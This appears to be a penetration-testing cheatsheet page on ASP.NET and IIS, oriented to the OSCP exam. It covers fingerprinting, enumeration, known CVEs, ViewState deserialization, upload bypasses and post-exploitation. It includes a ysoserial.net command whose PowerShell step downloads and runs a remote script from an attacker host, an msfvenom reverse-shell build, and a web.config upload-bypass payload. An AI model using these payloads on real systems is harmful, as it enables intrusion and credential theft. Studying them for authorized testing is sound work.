# .NET (ASP.NET / ASP.NET Core)

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Framework-specific](#5-framework-specific)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `X-Powered-By: ASP.NET` | ASP.NET (Framework, not Core) |
| `X-AspNet-Version: 4.0.30319` | ASP.NET Framework version |
| `X-AspNetMvc-Version: 5.2` | ASP.NET MVC version |
| `Server: Microsoft-IIS/10.0` | IIS 10 (Windows Server 2016+) |
| `Server: Kestrel` | ASP.NET Core (Kestrel, cross-platform) |
| `Set-Cookie: ASP.NET_SessionId=...` | ASP.NET Framework session |
| `Set-Cookie: .AspNetCore.Session=...` | ASP.NET Core session |
| `Set-Cookie: .AspNetCore.Antiforgery` | ASP.NET Core + antiforgery token |

### 1.2 Error messages

| Error text | Framework |
|------------|-----------|
| `Server Error in '/' Application` | ASP.NET Framework (default error page) |
| `Runtime Error` | ASP.NET Framework |
| `An unhandled exception occurred while processing the request` | ASP.NET Core (dev) |
| `System.NullReferenceException` | Any .NET |
| `System.Web.HttpException` | ASP.NET Framework |
| `Microsoft.AspNetCore` | ASP.NET Core |
| `Yellow Screen of Death (YSOD)` | ASP.NET Framework unhandled error |

### 1.3 File extensions and paths

| Path | Purpose |
|------|---------|
| `.aspx` | ASP.NET WebForms / MVC view |
| `.ashx` | ASP.NET handler |
| `.asmx` | ASP.NET web service (SOAP) |
| `.svc` | WCF service |
| `.cshtml` | Razor view (MVC/Core) |
| `/web.config` | IIS / ASP.NET config (DB creds, keys) |
| `/appsettings.json` | ASP.NET Core config |
| `/bin/` | Compiled DLLs |
| `/App_Data/` | App data (often SQLite, logs) |

---

## 2. Enumeration

### 2.1 Common files

| Path | Purpose |
|------|---------|
| `/web.config` | Config (connection strings, machineKey) |
| `/appsettings.json` | Core config |
| `/appsettings.Development.json` | Dev overrides |
| `/elmah.axd` | ELMAH error log (info disclosure) |
| `/trace.axd` | ASP.NET trace (info disclosure) |
| `/glasmx.axd` | ASP.NET client script |
| `/bin/*.dll` | Binaries (download + decompile) |

### 2.2 Version fingerprinting

```bash
curl -sI http://<TARGET>/ | grep -i "x-aspnet\|x-powered-by\|server"
curl -s http://<TARGET>/WebResource.axd?d=x
```

### 2.3 ASP.NET viewstate (WebForms)

Old ASP.NET WebForms uses `ViewState` (base64 in `__VIEWSTATE`). If `machineKey` leaks (from `web.config`), you can forge viewstate -> **RCE** via deserialization.

```bash
# Extract ViewState and __VIEWSTATEGENERATOR from a page
curl -s http://<TARGET>/page.aspx | grep -o '__VIEWSTATE[^"]*"[^"]*"'

# Decode
echo "<base64>" | base64 -d | xxd | head
```

Tools:
- **ysoserial.net** - generates payloads for .NET gadget chains
- **ViewStateDecoder** - decode + inspect

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2020-0688 | Exchange Server (ViewState) | RCE via static machineKey | https://nvd.nist.gov/vuln/detail/CVE-2020-0688 |
| CVE-2021-34473 | Exchange Server (ProxyShell) | RCE pre-auth | https://nvd.nist.gov/vuln/detail/CVE-2021-34473 |
| CVE-2021-34523 | Exchange Server (ProxyShell) | Elevation via PowerShell backend | https://nvd.nist.gov/vuln/detail/CVE-2021-34523 |
| CVE-2021-31207 | Exchange Server (ProxyShell) | Post-auth RCE via mailbox export | https://nvd.nist.gov/vuln/detail/CVE-2021-31207 |
| CVE-2022-41040 | Exchange Server (ProxyNotShell) | SSRF | https://nvd.nist.gov/vuln/detail/CVE-2022-41040 |
| CVE-2022-41082 | Exchange Server (ProxyNotShell) | RCE post-auth | https://nvd.nist.gov/vuln/detail/CVE-2022-41082 |
| CVE-2023-34362 | MOVEit Transfer | SQLi to RCE | https://nvd.nist.gov/vuln/detail/CVE-2023-34362 |
| CVE-2024-38063 | Windows TCP/IP (not .NET, but relevant) | RCE | https://nvd.nist.gov/vuln/detail/CVE-2024-38063 |

---

## 4. Exploitation patterns

### 4.1 ViewState deserialization (WebForms)

If you have the `machineKey` (from `web.config`, `appsettings.json`, or leaked), you can forge a ViewState payload that executes code on deserialization.

**Tools:**

- **ysoserial.net** (Windows, .NET)
- **ysoserial** (Linux, Java - different tool)

```bash
# Generate ViewState payload
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')" --validationalg="SHA1" --validationkey="<KEY>" --generator="<GEN>"
```

Submit payload as `__VIEWSTATE` in a POST request.

### 4.2 machineKey decryption (CVE-2020-0688 style)

If `machineKey` is static (default in some Exchange versions, IIS setups):

1. Extract `validationKey` + `decryptionKey` from `web.config`.
2. Use ysoserial.net to craft a ViewState payload.
3. Send it to trigger RCE.

### 4.3 Object deserialization (JSON.NET / BinaryFormatter)

If the app deserializes untrusted input with `TypeNameHandling.All` (Json.NET) or `BinaryFormatter`, RCE is possible.

**ysoserial.net generators:** `TypeConfuseDelegate`, `ObjectDataProvider`, `WindowsIdentity`, `PSObject`.

### 4.4 ASP.NET padding oracle (legacy)

CVE-2010-3332 (ASP.NET padding oracle) - allows decryption of `FormsAuthentication` cookies, potential account takeover.

### 4.5 IIS short filename enumeration (tilde)

IIS exposes 8.3 short names (`/ADMINI~1`) even when the long name is hidden.

```bash
# Tools
java -jar iis_shortname_scanner.jar 0 5 http://<TARGET>/
python3 shortscan.py http://<TARGET>/
```

### 4.6 Web.config exposure

If `/web.config` is served (misconfig), extract:

- `connectionStrings` - DB creds
- `machineKey` - for ViewState forgery
- `appSettings` - API keys, custom secrets

### 4.7 ViewState without MAC (legacy)

Older ASP.NET (`enableViewStateMac="false"`) allows ViewState tampering without machineKey. Very rare post-2014.

### 4.8 File upload bypass (.NET specific)

- `.aspx`, `.ashx`, `.asmx`, `.config`, `.asp`
- `.aspx;.jpg`, `.aspx%00.jpg`
- `.cer`, `.asa` - executed as ASP.NET by IIS
- `web.config` - can set handlers (like `.htaccess` in Apache)

**web.config payload for upload bypass:**

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg-aspx" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

Upload this as `web.config`, then a `.jpg` file with ASP.NET code executes.

---

## 5. Framework-specific

### 5.1 ASP.NET Framework (WebForms / MVC)

- `/web.config` - config
- `/bin/*.dll` - compiled
- `/App_Data/` - data
- `__VIEWSTATE` - ViewState (WebForms)
- `__EVENTVALIDATION` - event validation
- `/trace.axd` - trace (if enabled)
- `/elmah.axd` - ELMAH logs (if enabled)

### 5.2 ASP.NET Core

- `/appsettings.json`, `/appsettings.Production.json`
- `/Properties/launchSettings.json`
- `/wwwroot/` - static files
- `/Pages/` - Razor Pages
- `/Controllers/` - MVC / API controllers
- `/swagger`, `/swagger/index.html` - Swagger UI (API exploration)
- `/openapi.json` - OpenAPI schema

### 5.3 IIS

- `/iisstart.htm` - default IIS page
- `/web.config` - config
- `/%7E` + name - short filename (tilde)
- `/trace.axd` - trace
- `/elmah.axd` - ELMAH

### 5.4 Windows-specific quirks

- `::$DATA` - NTFS alternate data stream bypass
- `.` at end (trailing dot) - stripped by IIS
- ` ` (space) - stripped by IIS
- `//` (double slash) - path normalization

---

## 6. Post-exploitation

### 6.1 Read config files

```text
/web.config
/appsettings.json
/appsettings.Production.json
/App_Data/*.config
/ConnectionStrings.config
```

### 6.2 Extract machineKey (for ViewState RCE)

```xml
<system.web>
  <machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES" />
</system.web>
```

### 6.3 IIS app pools

```bash
# On Windows target (after RCE)
C:\Windows\System32\inetsrv\appcmd.exe list apppool
C:\Windows\System32\inetsrv\appcmd.exe list sites
```

### 6.4 .NET reverse shell

Use **ysoserial.net** for a ViewState/deserialization RCE, or **msfvenom**:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
```

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the framework fingerprint (X-AspNet-Version, Server: Microsoft-IIS, Kestrel) that identifies .NET.

> [!IMPORTANT]
> OSCP report: screenshot `/web.config` or `/appsettings.json` read (creds, machineKey).

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE (ViewState payload output, uploaded .aspx/.ashx shell).

---

## 8. References

- ASP.NET official docs: https://learn.microsoft.com/en-us/aspnet/
- HackTricks - .NET: https://book.hacktricks.xyz/pentesting-web/deserialization
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- PayloadsAllTheThings - .NET: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/.Net%20Deserialization
- CVE-2020-0688: https://nvd.nist.gov/vuln/detail/CVE-2020-0688
- CVE-2021-34473: https://nvd.nist.gov/vuln/detail/CVE-2021-34473
- CVE-2021-34523: https://nvd.nist.gov/vuln/detail/CVE-2021-34523
- CVE-2021-31207: https://nvd.nist.gov/vuln/detail/CVE-2021-31207
- CVE-2022-41040: https://nvd.nist.gov/vuln/detail/CVE-2022-41040
- CVE-2022-41082: https://nvd.nist.gov/vuln/detail/CVE-2022-41082
- CVE-2023-34362: https://nvd.nist.gov/vuln/detail/CVE-2023-34362
- CVE-2024-38063: https://nvd.nist.gov/vuln/detail/CVE-2024-38063

---